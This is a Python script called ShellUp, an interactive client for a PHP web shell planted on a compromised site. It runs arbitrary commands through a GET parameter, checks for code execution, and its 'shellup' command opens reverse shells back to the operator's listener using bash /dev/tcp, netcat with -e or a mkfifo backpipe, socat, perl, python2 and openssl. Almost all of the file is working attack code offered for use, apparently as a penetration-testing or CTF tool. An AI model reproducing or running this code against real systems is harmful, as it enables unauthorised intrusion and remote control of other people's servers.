#!/usr/bin/env python3
"""
    ShellUp is a means to communicate with a php script without having to
    open up burp suite to issue commands.

    It assumes the following is in place on whatever php script you were able to write:

    <?php system($_GET['cmd']); ?>
"""

import requests
import socket
import argparse
import random
import string
import cmd
import sys


def randomString(stringLength=20):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def invoke_command(url, invoke_word, cmd, proxy_string=""):
    """
    connects to the URL, sends a message through the PHP parameter
    """
    if len(proxy_string):
        # This assumes the string is something like
        # http://localhost:8080
        try:
            protocol = split(":", 1)
            proxies = {protocol[0]: proxy_string}

        except ValueError:
            # Invalid proxy string, will figure out
            # how to best handle this another time
            proxy_string = ""

    rstring = randomString()
    prefix = f"{rstring}_BEGIN"
    suffix = f"{rstring}_END"

    wrapped_command = f"echo -n {prefix}; {cmd} ; echo -n {suffix}"
    payload = { invoke_word: wrapped_command }
    if len(proxy_string):
        r = requests.get(url, params=payload, proxies=proxies)
    else:
        r = requests.get(url, params=payload)
    if prefix in r.text:
        split_left, split_right = r.text.split(prefix)
        content, split_remainder = split_right.split(suffix)
        return content

    return None

def test_for_code_exec(url, invoke_word, proxy_string=""):
    """
    Utilizes the "invoke_command" function to run a simple test
    to determine if we have code execution. Currently only works
    for linux and bash, which is kinda typical.
    """
    test_string = randomString()
    test_var = randomString()
    cmd_string = f"export tfce{test_var}={test_string} && echo $tfce{test_var}"
    result = invoke_command(url, invoke_word, cmd_string, proxy_string)
    if result is None:
        return False
    if test_string in result:
        return True
    return False

def check_for_binary(url, invoke_word, binary):
    """
    Utilizes the "invoke_command" function to run a simple test
    to determine if a binary exists in our path, returns the path
    if it exists, NoneType if it does not.
    """
    cmd_string = f"which {binary}"
    result = invoke_command(url, invoke_word, cmd_string)
    if binary in result:
        return result.strip()
    return None

class Terminal(cmd.Cmd):
    prompt = "Command => "

    def __init__(self, target, invoke_word, lhost, lport, proxy):
        super().__init__()
        self.target = target
        self.invoke_word = invoke_word
        self.lhost = lhost
        self.lport = lport
        self.proxy_string = proxy

    def default(self, args):
        output = invoke_command(self.target, self.invoke_word, args, proxy_string=self.proxy_string)
        if output is None:
            print("No output!")
        else:
            print(output)
    
    def do_exit(self, args):
        print("Exiting.")
        sys.exit(0)

    def do_shellup(self, shelltype):
        """
        Will issue a reverse callback using common binaries on the remote system.
        To determine types, type "shellup" without arguments. This will print the
        list of shellup methods we can use. To issue a shellup callback with bash
        as an example, use:

        shellup bash
        """
        shelltypes = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
        if shelltype in shelltypes:
            if shelltype == 'bash':
                print("Is your listener running? Then you'd better catch it!")
                shell_cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
                invoke_command(self.target, self.invoke_word, shell_cmd)
            elif shelltype == 'evilnc':
                print("Checking if netcat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "nc")
                if binary is None:
                    print("Netcat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    print("Running netcat with assumption that --gapingsecurityhole compile flag is set...")
                    shell_cmd = f"{binary} -e /bin/sh {self.lhost} {self.lport}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
                    print("If you did not receive a callback, it could be that the remote version of netcat")
                    print("is incompatible with the -e flag. Try the regular nc shellup!")
            elif shelltype == 'nc':
                print("Checking if netcat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "nc")
                if binary is None:
                    print("Netcat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    print("Running netcat with super secret backpipe technology...")
                    rstring = randomString()
                    shell_cmd = f"rm -f /tmp/backpipe_{rstring};mkfifo /tmp/backpipe_{rstring}; cat /tmp/backpipe_{rstring}|/bin/sh -i 2>&1|{binary} {self.lhost} {self.lport} >/tmp/backpipe_{rstring}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
            elif shelltype == 'socat':
                print("Start up a socat listener on your machine with this command:")
                print("socat file:`tty`,raw,echo=0 tcp-listen:{self.lport}")
                print("Checking if socat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "socat")
                if binary is None:
                    print("Socat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    shell_cmd = f"{binary} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.lhost}:{self.lport}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
            elif shelltype == "perl":
                print("Checking if perl exists...")
                binary = check_for_binary(self.target, self.invoke_word, "perl")
                if binary is None:
                    print("Perl does not exist in PATH!")
                else:
                    print("Perl exists!")
                    shell_cmd = f"{binary} -e 'use Socket;$i=\"{self.lhost}\";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
            elif shelltype == "python2":
                print("Checking if python2 exists...")
                binary = check_for_binary(self.target, self.invoke_word, "python2")
                if binary is None:
                    print("Python2 does not exist in PATH!")
                else:
                    print("Python2 exists!")
                    shell_cmd = f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
            elif shelltype == "openssl":
                print("Checking if openssl exists...")
                binary = check_for_binary(self.target, self.invoke_word, "openssl")
                if binary is None:
                    print("OpenSSL does not exist in PATH!")
                else:
                    print("OpenSSL exists!")
                    print("Make sure you run the following commands on the client side:")
                    print(f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
                    print("<< hit enter for all defaults >>")
                    print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {self.lport}")
                    rstring = randomString()
                    shell_cmd = f"mkfifo /tmp/backpipe_{rstring}; /bin/bash -I 2>&1 < /tmp/backpipe_{rstring} | {binary} s_client -quiet -connect {self.lhost}:{self.lport} > /tmp/backpipe_{rstring}; rm -f /tmp/backpipe_{rstring}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd)
        else:
            print(f"Please choose a shelltype from {shelltypes}")


def main(t, i, lh, lp, p):
    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp, proxy=p)
    print("Testing first for code execution...")
    if test_for_code_exec(t, i, proxy_string=p):
        print("We have code execution!")
    else:
        print("Code Execution Test failed, dropping to REPL anyway.")
        print("Check for blind code exec, listen for pingback.")
    
    term.cmdloop()

if __name__ == "__main__":
    ip_address = socket.gethostbyname(socket.getfqdn())
    parser = argparse.ArgumentParser(description="This app will interact with a compromised webpage.")
    parser.add_argument("url", help="Enter the page you want to connect to, preceeded with http/https.")

    parser.add_argument("-lh", "--lhost",
                        action="store",
                        dest="lhost",
                        default=ip_address,
                        help=f"Enter your local IP address visible to target, defaults to {ip_address}")

    parser.add_argument("-i", "--invoke",
                        action="store",
                        dest="invoke",
                        help="Enter invoke word (ie: ?cmd=whoami, where invoke word is 'cmd', defaults to cmd)",
                        default="cmd")

    parser.add_argument("-lp", "--lport",
                        action="store",
                        dest="lport",
                        help="Enter the local port, defaults to 9090",
                        default=9090)

    parser.add_argument("-p", "--proxy",
                        action="store",
                        default="",
                        dest="proxy",
                        help="to use a proxy, add IP:PORT, ex: -p 127.0.0.1:8080")
    args = parser.parse_args()
    main(t=args.url, i=args.invoke, lh=args.lhost, lp=args.lport, p=args.proxy)